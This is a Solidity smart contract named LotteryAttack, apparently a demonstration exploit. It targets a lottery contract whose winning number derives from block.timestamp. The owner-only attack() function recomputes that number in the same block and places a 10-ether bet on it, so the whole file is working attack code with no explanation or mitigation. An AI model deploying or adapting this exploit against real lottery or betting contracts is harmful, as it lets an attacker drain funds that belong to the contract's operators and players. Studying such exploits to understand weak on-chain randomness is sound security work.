pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface DemoInterface {
    function placeBet(uint8 _number) external payable ;  
    
}

contract LotteryAttack is Ownable {

    DemoInterface private victimContract;
    constructor(address _victimContract) {
        victimContract = DemoInterface(_victimContract);
    }

    function attack() external payable onlyOwner {
        uint8 winningNumber = getWiningNumber();        
        victimContract.placeBet{value: 10 ether}(winningNumber);        
    }

    function getWiningNumber() private view returns(uint8) {
        return uint8(uint256(keccak256(abi.encode(block.timestamp))) % 254) + 1;
    }
}